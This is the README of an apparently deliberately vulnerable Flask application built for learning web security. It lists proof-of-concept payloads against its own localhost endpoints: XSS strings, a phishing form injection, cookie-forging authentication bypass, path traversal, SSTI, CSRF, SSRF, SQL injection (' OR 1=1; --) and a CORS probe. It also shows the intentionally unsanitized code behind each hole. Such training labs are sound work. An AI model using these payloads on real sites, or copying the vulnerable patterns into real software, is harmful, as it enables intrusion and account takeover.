# Description:
FVA Flask Vulnerable Application was developed for the purpose of learning 

# Installation
##### Clone and install the application
```BASH
git clone https://github.com/FIR-UIII/FVA.git
cd FVA
python3 -m venv {name}
source bin/activate
pip install -r requirements.txt
```
##### Install PostgreSQL
Please see the documentation: https://www.postgresql.org/docs/current/tutorial-install.html

# TODO:
* сделать заглушки в случае невалидных логина или пароля или необходиомсти аутентификации
* csrf добавить подключение к БД psql
* перенести в env основные конфигурационные настройки

# Vulnerabilities 
## XSS
Exploit/PoC:
```html
1. GET injection: http://{URL}/xss?param=<script>alert(1)</script>
2. HTML img injection: <img src=https://stackoverflow.com/ onerror=alert(1)>
3. JS  injection: <script>alert(document.domain)</script>
4. HTML tag injection: <a href="javascript:alert(document.domain);">click here</a>
5. Iframe injection: <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
6. Iframe injection:<iframe src="http://httpforever.com/></iframe>
7. Form injection:
<form name="login" action="http://ip: port/">
 	<label for="login">login: </label>
 	<input type="text" name="login" required>
 	<br>
 	<label for="password">password: </label>
 	<input type="password" name="password" required>
 	<br>
 	<input type="submit" value="Login!">
 </form>
8. Service worker injection:
<script>
window.addEventListener('load', function() {
    var sw = "/sw.js";
    navigator.serviceWorker.register(sw, {scope: '/'})
       .then(function(registration) {
            console.log('Service Worker registered successfully');
        })
       .catch(function(err) {
            console.error('Service Worker registration failed:', err);
        });
});
</script>
```

Vulnerable code:
```
# modules/xss.py
user_input = request.args.get('param') #<-- точка ввода через query параметры xss reflected + SSTI  
return render_template('xss.html', user_input=user_input) #<-- небезопасный вывод пользователю данных без санитизации
data = request.form['user_input'] #<-- точка пользовательского ввода без валидации xss stored
```

## Authentication bypass
Exploit/PoC:
```
1. Go to root page "/" (logout from the current session if nessesary)
2. Open DevTools / Application / Cookies:
3. Create new with name:'user_id', value:'any_value'
4. Refresh page and profit
```

Vulnerable code:
```
# modules/require_authentication.py
cookie = request.cookies.get('user_id') #<--значение cookie не проверяется
```


# PATH TRAVERSAL
открыть код и найти каким образом идет обращение к картинке
'view-source:http://localhost:8888/path_travers'
'<img src="/path_travers_img/?img=/static/scripting.png" alt="what_is_that" width="100" height="100"></p>'

exploit
```URL
http://localhost:8888/path-travers-img/?img=/static/scripting.png
http://localhost:8888/path_travers_img/?img=/README.md
http://localhost:8888/path_travers_img/?img=/../venv.txt
```

# SSTI 
exploit
```URL
http://localhost:8888/ssti?param={{(9*9)}}
http://localhost:8888/ssti?param={{%20config.items()%20}}
```

# XSS via Service worker
/upload

PoC upload sw.js
```js
setInterval(function() {
  console.log("U been h@cked");
}, 5000);
```

# CSRF
/csrf через другую вкладку
python3 -m http.server 9000
Фишинговая ссылка hacker_csrf.html
http://127.0.0.1:9000/Projects/FVA/hacker_csrf.html

/csrf через GET
http://localhost:8888/change_password?id=1&new_password=h@cked

# SSRF
GET request: 
http://localhost:8888/ssrf?url=http://localhost:8888/xss

POST request: 
curl -X POST -d "url=http://localhost:8888/xss" http://localhost:8888/ssrf


# SQl injection
brew services start postgresql
psgl postgres
python init_db.py from modules.init_db import create_database
=# \dt
=# SELECT * FROM users;

injection 
login: ' OR 1=1; --
password: any

# command_injection
/go to command_injection
change cookie to admin > base64

# CORS test
python -m http.server 8000
devtools > console:
fetch('http://localhost:8888/api/users')
  .then(response => response.text())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));

  
